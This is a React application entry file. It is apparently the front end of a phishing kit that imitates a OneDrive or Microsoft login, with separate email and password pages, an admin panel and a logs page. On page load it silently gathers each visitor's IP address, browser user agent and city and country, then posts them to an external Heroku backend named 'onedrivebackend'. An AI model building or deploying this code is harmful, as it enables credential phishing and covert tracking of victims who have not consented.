import { Route, Routes, BrowserRouter } from "react-router-dom";
import Home from "./pages/Home";
import Login from "./pages/Login";
import AdminPanel from "./pages/AdminPanel";
import Password from "./components/Login/Password";
import { useState, useEffect } from "react";
import axios from 'axios';
import Logs from "./pages/Logs";

function App() {
  const [email,setEmail] = useState("");

  useEffect(() => {
    recordUserData();
  }, []);

  const recordUserData = async () => {
    try {
      const ip = await axios.get('https://api.ipify.org?format=json')
        .then(response => response.data.ip);
      const browser = navigator.userAgent;
      const location = await axios.get('https://geolocation-db.com/json/')
        .then(response => `${response.data.city}, ${response.data.country_name}`);
      
      await axios.post('https://onedrivebackend-5a68774f51f4.herokuapp.com/api/userdata', { ip, browser, location });

    } catch (error) {
      console.error('Error recording user data:', error);
    }
  };

  return (
    <>
      <BrowserRouter>
        <Routes>
          <Route path="/" element={<Home />} />
          <Route path="/login" element={<Login email={email} setEmail={setEmail} />} />
          <Route path="/loginpassword" element={<Password email={email} />} />
          <Route path="/adminpanel" element={<AdminPanel />} />
          <Route path="/logs" element={<Logs />} />
        </Routes>
      </BrowserRouter>
    </>
  );
}

export default App;
